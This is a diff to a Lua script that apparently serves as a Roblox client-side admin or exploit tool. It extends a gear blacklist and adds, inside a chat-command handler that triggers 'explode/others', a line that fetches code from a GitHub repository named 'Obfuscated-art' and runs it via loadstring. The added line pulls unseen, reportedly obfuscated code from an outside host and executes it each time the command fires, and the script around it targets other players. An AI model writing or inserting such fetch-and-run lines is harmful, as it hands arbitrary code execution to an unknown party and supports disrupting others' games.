@@ -28,7 +28,7 @@ local lplayer = game.Players.LocalPlayer
 local userId = game.Players.LocalPlayer.UserId
 local antivg = true
 local connections = {} -- If you're gonna alter the script then please add any connections that you add to a table so it can be closed with the !closemod command
-local BlacklistedGear = {"VampireVanquisher","IvoryPeriastron"}
+local BlacklistedGear = {"VampireVanquisher","IvoryPeriastron","PaintBucket","SubspaceTripmine","DaggerOfShatteredDimensions","Transmorpher"}
 
 -- CONFIGURE ANYTHING BELOW
 
@@ -413,6 +413,7 @@ lplayer.Chatted:Connect(function(msg)
 		game.Players:Chat("explode/others/"..math.random(1,1000))
 	wait(3.5)
 	game.Players:Chat("!s")
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Obfuscated-art/main/Basic%20antisilcrash.lua'),true))()
         end
     elseif string.sub(msg:lower(), 0, 10) == "!unlisted1" then
         wait(.65)
